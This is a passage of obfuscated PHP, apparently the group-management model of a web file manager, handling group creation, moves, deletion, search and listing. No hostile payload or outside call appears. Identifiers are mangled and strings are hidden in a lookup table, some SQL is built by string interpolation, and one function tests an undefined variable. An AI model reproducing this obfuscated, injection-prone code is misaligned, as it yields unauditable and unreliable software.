(isset($‡³¸Í¬[$àÄƒ†£É[1987]])) { $«Îù¼±â[$àÄƒ†£É[1987]] = $‡³¸Í¬[$àÄƒ†£É[1987]]; } else { $§ÍÊÀÑ‚ = $this->max($àÄƒ†£É[1987]); if (!$§ÍÊÀÑ‚) { $§ÍÊÀÑ‚ = 0; } $«Îù¼±â[$àÄƒ†£É[1987]] = $§ÍÊÀÑ‚ + 1; } if (!empty($‡³¸Í¬[$àÄƒ†£É[1963]])) { $«Îù¼±â[$àÄƒ†£É[1963]] = $‡³¸Í¬[$àÄƒ†£É[1963]]; } $ª¢§‘ÇÎ = $this->add($«Îù¼±â); $this->setNamePinyin($ª¢§‘ÇÎ, $«Îù¼±â[$àÄƒ†£É[32]]); if (isset($‡³¸Í¬[$àÄƒ†£É[2054]])) { $this->metaSet($ª¢§‘ÇÎ, array($àÄƒ†£É[2054] => $‡³¸Í¬[$àÄƒ†£É[2054]], $àÄƒ†£É[2055] => $‡³¸Í¬[$àÄƒ†£É[2055]])); unset($‡³¸Í¬[$àÄƒ†£É[2054]]); unset($‡³¸Í¬[$àÄƒ†£É[2055]]); } Model($àÄƒ†£É[1414])->groupRootAdd($ª¢§‘ÇÎ); $this->_clearCache($‡³¸Í¬[$àÄƒ†£É[192]]); return $ª¢§‘ÇÎ; } protected function groupEdit($·…È†êÏ, $‚â âµ) { $’Å©ÛŠ =& $_SERVER[Ş­ğŠìÒ]; $àÀ¹¡…Ÿ = $this->getInfoSimple($·…È†êÏ); if (!$àÀ¹¡…Ÿ) { return !1; } if (!empty($‚â âµ[$’Å©ÛŠ[192]])) { $ƒğÒÚã· = $this->getInfoSimple($‚â âµ[$’Å©ÛŠ[192]]); if (!$ƒğÒÚã·) { return !1; } if ($àÀ¹¡…Ÿ[$’Å©ÛŠ[1963]] == $ƒğÒÚã·[$’Å©ÛŠ[1963]]) { return !1; } if ($‚â âµ[$’Å©ÛŠ[192]] != $àÀ¹¡…Ÿ[$’Å©ÛŠ[192]]) { if ($ƒğÒÚã·[$’Å©ÛŠ[584]] !== $àÀ¹¡…Ÿ[$’Å©ÛŠ[584]] && strpos($ƒğÒÚã·[$’Å©ÛŠ[584]], $àÀ¹¡…Ÿ[$’Å©ÛŠ[584]] . $àÀ¹¡…Ÿ[$’Å©ÛŠ[1963]] . $’Å©ÛŠ[50]) === 0) { return !1; } $‚â âµ[$’Å©ÛŠ[652]] = $ƒğÒÚã·[$’Å©ÛŠ[584]] . $‚â âµ[$’Å©ÛŠ[192]] . $’Å©ÛŠ[50]; $this->_changeChildLevel($àÀ¹¡…Ÿ, $ƒğÒÚã·); $this->_clearCache($ƒğÒÚã·[$’Å©ÛŠ[1963]]); $this->_clearCache($àÀ¹¡…Ÿ[$’Å©ÛŠ[192]]); } } if (isset($‚â âµ[$’Å©ÛŠ[32]])) { $this->setNamePinyin($·…È†êÏ, $‚â âµ[$’Å©ÛŠ[32]]); } if (isset($‚â âµ[$’Å©ÛŠ[2054]])) { $this->metaSet($·…È†êÏ, array($’Å©ÛŠ[2054] => $‚â âµ[$’Å©ÛŠ[2054]], $’Å©ÛŠ[2055] => $‚â âµ[$’Å©ÛŠ[2055]])); unset($‚â âµ[$’Å©ÛŠ[2054]]); unset($‚â âµ[$’Å©ÛŠ[2055]]); } $this->_clearChildrenCache($àÀ¹¡…Ÿ); return $this->where(array($’Å©ÛŠ[2056] => $·…È†êÏ))->save($‚â âµ); } private function _clearChildrenCache($ıœäÇœâ) { $Ø¤ÑÊ×Ò =& $_SERVER[Ş­ğŠìÒ]; $¢Ê‹·Œá = array($Ø¤ÑÊ×Ò[652] => array($Ø¤ÑÊ×Ò[612], $ıœäÇœâ[$Ø¤ÑÊ×Ò[584]] . $ıœäÇœâ[$Ø¤ÑÊ×Ò[1963]] . $Ø¤ÑÊ×Ò[613])); $†Ëôâ‰– = $this->field($Ø¤ÑÊ×Ò[1963])->where($¢Ê‹·Œá)->select(); foreach ($†Ëôâ‰– as $ÑÔêï€¬) { $this->_clearCache($ÑÔêï€¬[$Ø¤ÑÊ×Ò[1963]]); } } private function _clearCache($’»ÄŠÚ) { $¤¾‘¢¶· =& $_SERVER[Ş­ğŠìÒ]; $this->cacheFunctionClear($¤¾‘¢¶·[2050], $’»ÄŠÚ); $this->cacheFunctionClear($¤¾‘¢¶·[2051], $’»ÄŠÚ); } private function _changeChildLevel($äÎë¹, $†Š€ïÈì, $Ö¯Óæş = false) { $ä ÷¸ïŠ =& $_SERVER[Ş­ğŠìÒ]; $îáèÒÛ = $äÎë¹[$ä ÷¸ïŠ[584]] . $äÎë¹[$ä ÷¸ïŠ[1963]] . $ä ÷¸ïŠ[50]; $Ş¼ßòÛ = $†Š€ïÈì[$ä ÷¸ïŠ[584]] . $†Š€ïÈì[$ä ÷¸ïŠ[1963]] . $ä ÷¸ïŠ[50] . $äÎë¹[$ä ÷¸ïŠ[1963]] . $ä ÷¸ïŠ[50]; if ($Ö¯Óæş) { $Ş¼ßòÛ = $†Š€ïÈì[$ä ÷¸ïŠ[584]] . $†Š€ïÈì[$ä ÷¸ïŠ[1963]] . $ä ÷¸ïŠ[50]; } $²é¹¼Ï³ = array($ä ÷¸ïŠ[652] => array($ä ÷¸ïŠ[612], $äÎë¹[$ä ÷¸ïŠ[584]] . $äÎë¹[$ä ÷¸ïŠ[1963]] . $ä ÷¸ïŠ[613])); $±´ŞİÓÀ = array($ä ÷¸ïŠ[652] => array($ä ÷¸ïŠ[661], "\162\x65\160\154\x61\143\145\x28\x70\x61\162\145\x6e\164\114\x65\x76\145\154\x2c\47{$îáèÒÛ}\x27\x2c\x27{$Ş¼ßòÛ}\x27\x29")); $this->_clearChildrenCache($äÎë¹); $this->where($²é¹¼Ï³)->data($±´ŞİÓÀ)->save(); } public function setNamePinyin($Şú…ùİ£, $Íñ»‰Ş = false) { $»š®‚Ï— =& $_SERVER[Ş­ğŠìÒ]; if (!$Íñ»‰Ş) { $ÔÎ°—¬È = $this->getInfoSimple($Şú…ùİ£); $Íñ»‰Ş = $ÔÎ°—¬È[$»š®‚Ï—[32]]; } if (!Input::check($Íñ»‰Ş, $»š®‚Ï—[655])) { $this->metaSet($Şú…ùİ£, $»š®‚Ï—[538], null); $this->metaSet($Şú…ùİ£, $»š®‚Ï—[537], null); return; } $‚êœ…Æ© = array($»š®‚Ï—[538] => str_replace($»š®‚Ï—[53], $»š®‚Ï—[12], Pinyin::get($Íñ»‰Ş)), $»š®‚Ï—[537] => Pinyin::get($Íñ»‰Ş, $»š®‚Ï—[656])); $this->metaSet($Şú…ùİ£, $‚êœ…Æ©); } protected function groupStatus($æğà´¼, $ç¬ÇéÜ) { $£¼Ğ —ø =& $_SERVER[Ş­ğŠìÒ]; $Ä­¢‹Ç = $this->getInfoSimple($æğà´¼); if (!$Ä­¢‹Ç) { return !1; } $this->_clearCache($æğà´¼); return $this->metaSet($æğà´¼, $£¼Ğ —ø[817], $ç¬ÇéÜ); if ($ç¬ÇéÜ == $£¼Ğ —ø[91]) { $€Ïáåæ³ = $this->parentLevelArray($Ä­¢‹Ç[$£¼Ğ —ø[584]]); } else { } $€Ïáåæ³[] = $Ä­¢‹Ç[$£¼Ğ —ø[1963]]; $ŒÍÅòù = array(); foreach ($€Ïáåæ³ as $æğà´¼) { $ŒÍÅòù[] = array($£¼Ğ —ø[1963] => $æğà´¼, $£¼Ğ —ø[97] => $£¼Ğ —ø[817], $£¼Ğ —ø[450] => $ç¬ÇéÜ); $this->_clearCache($æğà´¼); } return Model($£¼Ğ —ø[2057])->addAll($ŒÍÅòù, array(), !0); } protected function groupRemove($­·ªË, $ÎĞï·èÆ = false) { $×Ù¥Û×˜ =& $_SERVER[Ş­ğŠìÒ]; $ÌÒØ¢ŸÕ = array($×Ù¥Û×˜[1963] => $­·ªË); $‰—·şÚ« = $this->where($ÌÒØ¢ŸÕ)->find(); if (!$‰—·şÚ« || $‰—·şÚ«[$×Ù¥Û×˜[192]] == 0) { return !1; } if (!$ÎĞï·èÆ) { $ÚÌ´©‡Ù = $this->getInfoSimple($‰—·şÚ«[$×Ù¥Û×˜[192]]); $this->_changeChildLevel($‰—·şÚ«, $ÚÌ´©‡Ù, !0); $this->where(array($×Ù¥Û×˜[192] => $­·ªË))->save(array($×Ù¥Û×˜[192] => $‰—·şÚ«[$×Ù¥Û×˜[192]])); $this->_clearCache($ÚÌ´©‡Ù[$×Ù¥Û×˜[1963]]); } Model($×Ù¥Û×˜[2057])->where($ÌÒØ¢ŸÕ)->delete(); Model($×Ù¥Û×˜[2058])->where($ÌÒØ¢ŸÕ)->delete(); Model($×Ù¥Û×˜[891])->groupRootRemove($­·ªË); $this->_clearCache($‰—·şÚ«[$×Ù¥Û×˜[192]]); return $this->where($ÌÒØ¢ŸÕ)->delete(); } protected function groupSort($İ´€¤º) { $æµ˜¬ÒÛ =& $_SERVER[Ş­ğŠìÒ]; $…İáÄÍô = array(); foreach ($İ´€¤º as $ìÍğùœş => $ĞıòëÍó) { $…İáÄÍô[] = array($æµ˜¬ÒÛ[1963], $ĞıòëÍó, $æµ˜¬ÒÛ[1987], $ìÍğùœş + 1); } $this->saveAll($…İáÄÍô); } public function listData() { $–„æ¡ïê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($–„æ¡ïê[$_SERVER[Ş­ğŠìÒ][445]]); return $–„æ¡ïê; } private function _makeOrder($ÉÆ‚¹‰¼ = '') { $•şëîË =& $_SERVER[Ş­ğŠìÒ]; $¿”ƒÆ‹ = array($•şëîË[1963], $•şëîË[32], $•şëîË[1951], $•şëîË[231]); $ú¦Í˜ÒÂ = array($•şëîË[523] => $•şëîË[524], $•şëîË[525] => $•şëîË[526]); $Ì’Êé¾ = Input::get($•şëîË[530], $•şëîË[7], $•şëîË[1967], $¿”ƒÆ‹); $Äğü¼®Ş = Input::get($•şëîË[531], $•şëîË[7], $•şëîË[2059], array($•şëîË[2059], $•şëîË[525])); $Äğü¼®Ş = $ú¦Í˜ÒÂ[$Äğü¼®Ş]; $ÉÆ‚¹‰¼ = $ÉÆ‚¹‰¼ . "{$Ì’Êé¾}\x20{$Äğü¼®Ş}\x2c\x20\x67\162\157\165\160\111\104\40\141\163\x63"; return $this->order($ÉÆ‚¹‰¼); } public function listChild($ „Öï¥Ô) { $Í¤şÌ =& $_SERVER[Ş­ğŠìÒ]; $Ù¦€®ãä = $this->where(array($Í¤şÌ[192] => $ „Öï¥Ô))->_makeOrder()->selectPage(200); $this->_listDataApply($Ù¦€®ãä[$Í¤şÌ[445]]); return $Ù¦€®ãä; } public function listChildIds($È˜“öé˜) { $§³ë€ =& $_SERVER[Ş­ğŠìÒ]; if (is_string($†ŞÃ™‡“)) { $È˜“öé˜ = explode($§³ë€[50], $È˜“öé˜); } $Ñ×ó’È‚ = $this->where(array($§³ë€[1963] => array($§³ë€[7], $È˜“öé˜)))->field($§³ë€[2060])->select(); if (!$Ñ×ó’È‚) { return !1; } $²»‚¢Å› = array(); foreach ($Ñ×ó’È‚ as $¾×àú¢³) { $²»‚¢Å›[] = "\x73\x65\154\x65\x63\164\40\x67\x72\157\165\160\x49\104\40\146\162\x6f\x6d\x20\140\x67\x72\x6f\x75\x70\140\x20\167\x68\x65\x72\145\x20\160\141\x72\145\156\x74\114\145\x76\145\154\x20\x6c\x69\x6b\145\x20\x27{$¾×àú¢³[$§³ë€[584]]}{$¾×àú¢³[$§³ë€[1963]]}\54\x25\47"; } $²»‚¢Å› = implode($§³ë€[2061], $²»‚¢Å›); $Ñ×ó’È‚ = $this->query($²»‚¢Å›); if (!$Ñ×ó’È‚) { return array(); } $È˜“öé˜ = array_to_keyvalue($Ñ×ó’È‚, $§³ë€[12], $§³ë€[1963]); return array_unique($È˜“öé˜); } public function listByID($ƒÃ©ÙÛ–) { $Õõø ù =& $_SERVER[Ş­ğŠìÒ]; if (!$ƒÃ©ÙÛ–) { return array(); } $Ş›óàèÁ = array($Õõø ù[1963] => array($Õõø ù[7], $ƒÃ©ÙÛ–)); $Å¿¯ÄË« = $this->where($Ş›óàèÁ)->select(); $Å¿¯ÄË« = array_sort_keep($Å¿¯ÄË«, $Õõø ù[1963], $ƒÃ©ÙÛ–); $this->_listDataApply($Å¿¯ÄË«); return $Å¿¯ÄË«; } public function listSearch($¡åšÁİı) { $İâòúí =& $_SERVER[Ş­ğŠìÒ]; $¦¨“§›Á = trim($¡åšÁİı[$İâòúí[2062]]); $“Š¬Á£Ë = explode($İâòúí[53], $¦¨“§›Á); if (!$¦¨“§›Á || count($“Š¬Á£Ë) == 1) { return $this->listSearchNow($¡åšÁİı); } $Ü‘‚¬è = array($İâòúí[445] => array()); foreach ($“Š¬Á£Ë as $®ûøš×’) { if (!trim($®ûøš×’)) { continue; } $¡åšÁİı[$İâòúí[2062]] = $®ûøš×’; $ä¦òƒò = $this->listSearchNow($¡åšÁİı); $Ü‘‚¬è[$İâòúí[445]] = array_merge($Ü‘‚¬è[$İâòúí[445]], $ä¦òƒò[$İâòúí[445]]); } $Ü‘‚¬è[$İâòúí[445]] = array_unique_by_key($Ü‘‚¬è[$İâòúí[445]], $İâòúí[1963]); $Ü‘‚¬è[$İâòúí[442]] = array($İâòúí[443] => count($Ü‘‚¬è[$İâòúí[445]]), $İâòúí[439] => 20, $İâòúí[429] => 1, $İâòúí[444] => 1); return $Ü‘‚¬è; } public function listSearchNow($á¼À›) { $íö§Ì‰Ô =& $_SERVER[Ş­ğŠìÒ]; $ÔáîÅˆÌ = trim($á¼À›[$íö§Ì‰Ô[2062]]); $úÙ¨‘Ø¦ = isset($á¼À›[$íö§Ì‰Ô[2063]]) ? $á¼À›[$íö§Ì‰Ô[2063]] : !1; if (!trim($ÔáîÅˆÌ)) { return !1; } $ÔáîÅˆÌ = str_replace($íö§Ì‰Ô[2064], $íö§Ì‰Ô[2065], $ÔáîÅˆÌ); $¡—•¥ = array($íö§Ì‰Ô[1963] => array($íö§Ì‰Ô[459], "{$ÔáîÅˆÌ}\45"), $íö§Ì‰Ô[32] => array($íö§Ì‰Ô[459], "\45{$ÔáîÅˆÌ}\x25"), $íö§Ì‰Ô[1074] => $íö§Ì‰Ô[2066]); if ($úÙ¨‘Ø¦) { $¾œê¨øè = $this->getInfoSimple($úÙ¨‘Ø¦); $ü±ÕØ½Ù = $¾œê¨øè[$íö§Ì‰Ô[584]] . $úÙ¨‘Ø¦ . $íö§Ì‰Ô[613]; $¡—•¥ = array($¡—•¥, array($íö§Ì‰Ô[584] => array($íö§Ì‰Ô[459], $ü±ÕØ½Ù))); } $¡—•¥ = $this->parseWhereLike($¡—•¥); $—©ü—¤ = $this->_makeOrder()->where($¡—•¥)->selectPage(20); $—©ü—¤ = $—©ü—¤ ? $—©ü—¤ : array($íö§Ì‰Ô[445] => array(), $íö§Ì‰Ô[442] => array()); if (!$—©ü—¤ || count($—©ü—¤[$íö§Ì‰Ô[445]]) < 5 && Input::check($ÔáîÅˆÌ, $íö§Ì‰Ô[394])) { $İ™ÎŞ´ = $this->groupChildrenAll($úÙ¨‘Ø¦); $ãùì± = $this->_searchFromMeta($íö§Ì‰Ô[537], $ÔáîÅˆÌ, 10, $İ™ÎŞ´); $‰ï—åÛĞ = $this->_searchFromMeta($íö§Ì‰Ô[538], $ÔáîÅˆÌ, 10, $İ™ÎŞ´); $ŠÍËÚßË = array_merge($ãùì±, $‰ï—åÛĞ, $—©ü—¤[$íö§Ì‰Ô[445]]); $—©ü—¤[$íö§Ì‰Ô[445]] = array_unique_by_key($ŠÍËÚßË, $íö§Ì‰Ô[1963]); $—©ü—¤[$íö§Ì‰Ô[442]][$íö§Ì‰Ô[443]] = count($—©ü—¤[$íö§Ì‰Ô[445]]); $—©ü—¤[$íö§Ì‰Ô[442]][$íö§Ì‰Ô[444]] = ceil($—©ü—¤[$íö§Ì‰Ô[442]][$íö§Ì‰Ô[443]] / $—©ü—¤[$íö§Ì‰Ô[442]][$íö§Ì‰Ô[439]]); } $this->_listDataApply($—©ü—¤[$íö§Ì‰Ô[445]]); return $—©ü—¤; } protected function groupChildrenAll($Í¹–ğá) { $¡‡É€× =& $_SERVER[Ş­ğŠìÒ]; if (!$Í¹–ğá) { return !1; } if (!is_array($Í¹–ğá)) { $Í¹–ğá = array($Í¹–ğá); } $ó§Æı—ø = $Í¹–ğá; foreach ($Í¹–ğá as $˜Õ‚©) { $íœìÀ½ó = $this->getInfoSimple($˜Õ‚©); $Îü¿Ñ©† = array($¡‡É€×[584] => array($¡‡É€×[459], $íœìÀ½ó[$¡‡É€×[584]] . $˜Õ‚© . $¡‡É€×[613])); $Ø ’§›“ = $this->field($¡‡É€×[1963])->where($Îü¿Ñ©†)->select(); $ó§Æı—ø = array_merge($ó§Æı—ø, array_to_keyvalue($Ø ’§›“, $¡‡É€×[12], $¡‡É€×[1963])); } return array_unique($ó§Æı—ø); } private function _searchFromMeta($ì‘÷»œà, $Û™¦óÕû, $û—ß¨„, $—öŒ‰ü) { $ºŞÑëí =& $_SERVER[Ş­ğŠìÒ]; $Û™¦óÕû = strtolower($Û™¦óÕû); $¯£ ¯—Œ = array($ºŞÑëí[97] => $ì‘÷»œà, $ºŞÑëí[450] => array($ºŞÑëí[459], "\45{$Û™¦óÕû}\45")); $¯£ ¯—Œ = $this->parseWhereLike($¯£ ¯—Œ); if ($—öŒ‰ü) { $¯£ ¯—Œ[$ºŞÑëí[1963]] = array($ºŞÑëí[7], $—öŒ‰ü); } $ûõ©«Œê = Model($ºŞÑëí[2067])->where($¯£ ¯—Œ)->limit($û—ß¨„)->select(); if (!$ûõ©«Œê) { return array(); } $ûõ©«Œê = array_to_keyvalue($ûõ©«Œê, $ºŞÑëí[12], $ºŞÑëí[1963]); $€ËêëÆ» = $this->where(array($ºŞÑëí[2056] => array($ºŞÑëí[7], $ûõ©«Œê)))->select(); if (!$€ËêëÆ») { return array(); } return $€ËêëÆ»; } protected function _listDataApplyItem($œĞüĞÑÎ) { $¹Şå½À¦ = array($œĞüĞÑÎ); $this->_listDataApply($¹Şå½À¦); return $¹Şå½À¦[0]; } protected function _listDataApply(&$½ˆ™æô™) { $±Õóº¢Ş =& $_SERVER[Ş­ğŠìÒ]; if (!$½ˆ™æô™) { return; } $ö©öÆğï = array_to_keyvalue($½ˆ™æô™, $±Õóº¢Ş[12], $±Õóº¢Ş[1963]); $this->_listAppendChildren($½ˆ™æô™); $this->_listAppendChildrenMember($½ˆ™æô™); $this->_listAppendMeta($½ˆ™æô™, $ö©öÆğï); $this->_listAppendParent($½ˆ™æô™); $this->_listAppendSourceRoot($½ˆ™æô™, $ö©öÆğï); } private function _listAppendChildren(&$¯ó¨•š) { $€™õ‡ê =& $_SERVER[Ş­ğŠìÒ]; $ºÃüí‹« = array_to_keyvalue($¯ó¨•š, $€™õ‡ê[12], $€™õ‡ê[1963]); $¿ÈêÈÈÒ = array($€™õ‡ê[192] => array($€™õ‡ê[7], $ºÃüí‹«)); $¾Ùšæ„· = array($€™õ‡ê[192], $€™õ‡ê[2068] => $€™õ‡ê[565]); $ôà·Á­³ = $this->field($¾Ùšæ„·)->where($¿ÈêÈÈÒ)->group($€™õ‡ê[192])->select(); $ğÜÑÎë‚ = array_to_keyvalue($ôà·Á­³, $€™õ‡ê[192], $€™õ‡ê[565]); foreach ($¯ó¨•š as &$şÔÊÌó—) { $“˜ôâÑ = $şÔÊÌó—[$€™õ‡ê[1963]]; $şÔÊÌó—[$€™õ‡ê[2069]] = isset($ğÜÑÎë‚[$“˜ôâÑ]) ? intval($ğÜÑÎë‚[$“˜ôâÑ]) : !1; } unset($şÔÊÌó—); } private function _listAppendChildrenMember(&$Äúñ­ÃÄ) { $Ÿ¹ñ½‡° =& $_SERVER[Ş­ğŠìÒ]; $Æ••ï¢– = array_to_keyvalue($Äúñ­ÃÄ, $Ÿ¹ñ½‡°[12], $Ÿ¹ñ½‡°[1963]); $âŒ¶¯—¡ = array($Ÿ¹ñ½‡°[1963] => array($Ÿ¹ñ½‡°[7], $Æ••ï¢–)); $‘—®¬ù = array($Ÿ¹ñ½‡°[1963], $Ÿ¹ñ½‡°[2068] => $Ÿ¹ñ½‡°[565]); $‹Ù…­˜Î = Model($Ÿ¹ñ½‡°[2058])->field($‘—®¬ù)->where($âŒ¶¯—¡)->group($Ÿ¹ñ½‡°[1963])->select(); $¼Ø„Š¬Ñ = array_to_keyvalue($‹Ù…­˜Î, $Ÿ¹ñ½‡°[1963], $Ÿ¹ñ½‡°[565]); foreach ($Äúñ­ÃÄ as &$»ß–şßÑ) { $‰°©Šš¥ = $»ß–şßÑ[$Ÿ¹ñ½‡°[1963]]; $»ß–şßÑ[$Ÿ¹ñ½‡°[2070]] = isset($¼Ø„Š¬Ñ[$‰°©Šš¥]) ? intval($¼Ø„Š¬Ñ[$‰°©Šš¥]) : !1; } unset($»ß–şßÑ); } private function _listAppendMeta(&$øÄƒ¥–, $ğ™†çØ„) { $…¡Ï”š· =& $_SERVER[Ş­ğŠìÒ]; $à¾ßø•• = array($…¡Ï”š·[1963] => array($…¡Ï”š·[7], $ğ™†çØ„)); $ñ¥ÛÌø = Model($…¡Ï”š·[2057])->where($à¾ßø••)->select(); $ñ¥ÛÌø = array_to_keyvalue_group($ñ¥ÛÌø, $…¡Ï”š·[1963]); foreach ($ñ¥ÛÌø as &$áñùÓªÌ) { $áñùÓªÌ = array_to_keyvalue($áñùÓªÌ, $…¡Ï”š·[97], $…¡Ï”š·[450]); } unset($áñùÓªÌ); foreach ($øÄƒ¥– as &$›¿’ÆúÚ) { $›¿’ÆúÚ[$…¡Ï”š·[539]] = array(); if (isset($ñ¥ÛÌø[$›¿’ÆúÚ[$…¡Ï”š·[1963]]])) { $›¿’ÆúÚ[$…¡Ï”š·[539]] = $ñ¥ÛÌø[$›¿’ÆúÚ[$…¡Ï”š·[1963]]]; } } unset($›¿’ÆúÚ); } protected function parentLevelArray($…”Ÿù©¦) { $¬œƒÏæÏ =& $_SERVER[Ş­ğŠìÒ]; $…”Ÿù©¦ = explode($¬œƒÏæÏ[50], trim($…”Ÿù©¦, $¬œƒÏæÏ[50])); $…”Ÿù©¦ = array_remove_value($…”Ÿù©¦, $¬œƒÏæÏ[228]); return $…”Ÿù©¦; } protected function parentInGroup($€ÆûÖ¹Ş, $‘¾«Üşƒ) { $¸øùäú° =& $_SERVER[Ş­ğŠìÒ]; $æØİá“í = $this->getInfoSimple($€ÆûÖ¹Ş); if (!$æØİá“í) { return !0; } $á¶Ã÷¼¿ = $this->parentLevelArray($æØİá“í[$¸øùäú°[584]]); $á¶Ã÷¼¿[] = $€ÆûÖ¹Ş; foreach ($á¶Ã÷¼¿ as $€ÆûÖ¹Ş) { if (in_array($€ÆûÖ¹Ş . $¸øùäú°[12], $‘¾«Üşƒ)) { return !0; } } return !1; } private function _listAppendParent(&$¦Òı­À®) { $‡¡–¶Ñ” =& $_SERVER[Ş­ğŠìÒ]; $ˆã–“Üº = array(); foreach ($¦Òı­À® as &$©Éú‹¾®) { $ˆã–“Üº[$©Éú‹¾®[$‡¡–¶Ñ”[1963]]] = $©Éú‹¾®[$‡¡–¶Ñ”[32]]; $’õğ›Ë« = $this->parentLevelArray($©Éú‹¾®[$‡¡–¶Ñ”[584]]); foreach ($’õğ›Ë« as $»—ğş¦Ë) { if (!isset($ˆã–“Üº[$»—ğş¦Ë])) { $ˆã–“Üº[$»—ğş¦Ë] = 0; } } } unset($©Éú‹¾®); foreach ($ˆã–“Üº as $™•Éüà– => $¯¦Çä°¾) { if ($¯¦Çä°¾) { continue; } $¼ Ú÷¦ú = $this->getInfoSimple($™•Éüà–); $ˆã–“Üº[$™•Éüà–] = $¼ Ú÷¦ú[$‡¡–¶Ñ”[32]]; } $°¦Ùô¦Ë = $GLOBALS[$‡¡–¶Ñ”[6]][$‡¡–¶Ñ”[92]][$‡¡–¶Ñ”[2071]]; if (KodUser::isRoot()) { $°¦Ùô¦Ë = !1; } foreach ($¦Òı­À® as &$©Éú‹¾®) { $’õğ›Ë« = $this->parentLevelArray($©Éú‹¾®[$‡¡–¶Ñ”[584]]); $•ïìÒ¯ = $‡¡–¶Ñ”[12]; foreach ($’õğ›Ë« as $™•Éüà– => $»—ğş¦Ë) { if ($°¦Ùô¦Ë && $™•Éüà– == 0) { continue; } $•ïìÒ¯ .= $ˆã–“Üº[$»—ğş¦Ë] . $‡¡–¶Ñ”[8]; } if ($’õğ›Ë«) { $•ïìÒ¯ .= $©Éú‹¾®[$‡¡–¶Ñ”[32]]; } $©Éú‹¾®[$‡¡–¶Ñ”[589]] = str_replace($‡¡–¶Ñ”[592], $‡¡–¶Ñ”[8], $•ïìÒ¯); } unset($©Éú‹¾®); } private function _listAppendSourceRoot(&$àŸ…´îß, $¨Éê¢”) { $ëİ©ëĞÙ =& $_SERVER[Ş­ğŠìÒ]; $Íõƒ¦¢ˆ = Model($ëİ©ëĞÙ[891])->listSourceRoot(SourceModel::TYPE_GROUP, $¨Éê¢”); $Íõƒ¦¢ˆ = array_to_keyvalue($Íõƒ¦¢ˆ, $ëİ©ëĞÙ[569]); $Íõƒ¦¢ˆ = array_remove_key($Íõƒ¦¢ˆ, $ëİ©ëĞÙ[569]); foreach ($àŸ…´îß as &$‡¾áÙäÏ) { $‡¾áÙäÏ[$ëİ©ëĞÙ[90]] = $Íõƒ¦¢ˆ[$‡¾áÙäÏ[$ëİ©ëĞÙ[1963]]] ? $Íõƒ¦¢ˆ[$‡¾áÙäÏ[$ëİ©ëĞÙ[1963]]] : array(); } unset($‡¾áÙäÏ); } protected function groupMerge($ï®Ú½¬Ø) { $ï®Ú½¬Ø = array_values(array_unique($ï®Ú½¬Ø)); $ÓÊ¯±©³ = array(); for ($ØêµÑÓ = 0; $ØêµÑÓ < count($ï®Ú½¬Ø); $ØêµÑÓ++) { $™·´ªİ‰ = !1; for ($Ü‘Ÿì¦° = 0; $Ü‘Ÿì¦° < count($ï®Ú½¬Ø); $Ü‘Ÿì¦°++) { if ($ØêµÑÓ == $Ü‘Ÿì¦°) { continue; } if ($this->isParentOf($ï®Ú½¬Ø[$Ü‘Ÿì¦°], $ï®Ú½¬Ø[$ØêµÑÓ])) { $™·´ªİ‰ = !0; break; } } if (!$™·´ªİ‰) { $ÓÊ¯±©³[] = $ï®Ú½¬Ø[$ØêµÑÓ]; } } return $ÓÊ¯±©³; } protected function isParentOf($«À–ø“÷, $Ëè®›ˆ¼) { $­¶Õ¾êÓ =& $_SERVER[Ş­ğŠìÒ]; if (!$«À–ø“÷ || !$Ëè®›ˆ¼ || $«À–ø“÷ == $Ëè®›ˆ¼) { return !1; } $şÆëÇ‰ = $this->getInfoSimple($«À–ø“÷); $•Ú«ğŒÄ = $this->getInfoSimple($Ëè®›ˆ¼); $§ôú±úĞ = $şÆëÇ‰[$­¶Õ¾êÓ[584]] . $«À–ø“÷ . $­¶Õ¾êÓ[50]; if (substr($•Ú«ğŒÄ[$­¶Õ¾êÓ[584]], 0, strlen($§ôú±úĞ)) == $§ôú±úĞ) { return !0; } return !1; } public function groupShowRoot($Ò¹íî×À, $³Ğ¥§Ùª = false) { $Ü¡’îÕ÷ =& $_SERVER[Ş­ğŠìÒ]; $æü¾½Êü = $this->getInfo($Ò¹íî×À); if (!$æü¾½Êü) { return array(); } $Ğ×òå¡Á = $this->parentLevelArray($æü¾½Êü[$Ü¡’îÕ÷[584]]); $ØÒÁ²ƒ² = array($Ò¹íî×À); if (count($Ğ×òå¡Á) == 0) { return $ØÒÁ²ƒ²; } if ($³Ğ¥§Ùª && count($Ğ×òå¡Á) == 1) { return $ØÒÁ²ƒ²; } if (!$æü¾½Êü[$Ü¡’îÕ÷[539]] || !isset($æü¾½Êü[$Ü¡’îÕ÷[539]][$Ü¡’îÕ÷[2054]]) || $æü¾½Êü[$Ü¡’îÕ÷[539]][$Ü¡’îÕ÷[2054]] == $Ü¡’îÕ÷[843]) { return $this->groupShowRoot($Ğ×òå¡Á[count($Ğ×òå¡Á) - 1], $³Ğ¥§Ùª); } if ($æü¾½Êü[$Ü¡’îÕ÷[539]][$Ü¡’îÕ÷[2054]] == $Ü¡’îÕ÷[433]) { $´½ˆÁ = explode($Ü¡’îÕ÷[50], $æü¾½Êü[$Ü¡’îÕ÷[539]][$Ü¡’îÕ÷[2055]]); if ($´½ˆÁ) { $ØÒÁ²ƒ² = array_merge($ØÒÁ²ƒ², $´½ˆÁ); } } return $ØÒÁ²ƒ²; } protected function resetParentLevel() { $õ‡¶ó“ï =& $_SERVER[Ş­ğŠìÒ]; $…‘Ø†ú÷ = $õ‡¶ó“ï[1963]; $™Ã˜¡Šõ = $this->select(); $™Ã˜¡Šõ = array_to_keyvalue($™Ã˜¡Šõ, $…‘Ø†ú÷); foreach ($™Ã˜¡Šõ as $§ÂŒÅ¤µ) { $™·¶–¸‹ = $§ÂŒÅ¤µ; $Óï¢Ş = array(); while ($™·¶–¸‹[$õ‡¶ó“ï[192]] != 0) { $Óï¢Ş[] = $™·¶–¸‹[$õ‡¶ó“ï[192]]; $™·¶–¸‹ = $™Ã˜¡Šõ[$™·¶–¸‹[$õ‡¶ó“ï[192]]]; } $Óï¢Ş[] = 0; $Óï¢Ş = $õ‡¶ó“ï[50] . implode($õ‡¶ó“ï[50], array_reverse($Óï¢Ş)) . $õ‡¶ó“ï[50]; $this->setNamePinyin($§ÂŒÅ¤µ[$…‘Ø†ú÷], $§ÂŒÅ¤µ[$õ‡¶ó“ï[32]]); $this->where(array($…‘Ø†ú÷ => $§ÂŒÅ¤µ[$…‘Ø†ú÷]))->save(array($õ‡¶ó“ï[652] => $Óï¢Ş)); } return $™Ã˜¡Šõ; } public function groupNameAuto($Ä÷¢Ã²Œ, $åôÁ’É·) { $Î‡´’Ãó =& $_SERVER[Ş­ğŠìÒ]; 